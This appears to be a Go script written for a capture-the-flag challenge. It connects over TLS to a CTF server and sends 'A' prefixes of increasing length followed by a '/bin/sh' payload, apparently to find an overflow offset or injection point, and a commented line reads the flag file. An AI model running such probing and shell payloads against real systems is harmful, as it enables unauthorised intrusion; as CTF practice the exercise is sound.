package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"strconv"
)

func main() {

	server  := "ddd0e2c58c16fd13.ctf-bsidesthehague.com"
	payload := "/bin/sh\n"
	// cat /flag.txt\x00\n"

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // only for testing; remove in production
	}

	prefix := ""

	for b := 0; b < 200; b++ {

		prefix += "A"

		// Connect to the server

		conn, err := tls.Dial("tcp", server + ":1337", tlsConfig)
		if err != nil {
			log.Fatalf("Failed to connect: %v", err)
		}

		message := prefix + payload
		fmt.Println("prefix with " + strconv.Itoa(len(prefix)) + " bytes")

		conn.Write([]byte(message))

		// Use bufio.Reader to read until newline
		reader := bufio.NewReader(conn)
		reply, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Server errored:", err)
		} else {
			fmt.Println("Server replied:", string(reply))
		}

		conn.Close()

	}

}
